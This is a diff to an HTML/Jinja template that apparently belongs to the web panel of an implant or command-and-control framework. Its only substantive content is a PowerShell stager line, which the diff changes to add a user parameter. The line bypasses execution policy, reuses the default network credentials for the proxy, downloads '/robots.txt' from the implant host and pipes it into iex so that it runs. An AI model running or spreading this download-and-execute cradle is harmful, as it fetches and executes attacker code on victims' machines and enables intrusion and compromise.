@@ -10,7 +10,7 @@
 
 
             <div>
-        <code>powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<b>{{implant[3]}}</b>/robots.txt')|iex"</code>
+        <code>powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<b>{{implant[3]}}</b>/robots.txt?user={{ implant[4] }}')|iex"</code>
     </div><hr>
         {% endfor %}
     {% else %}
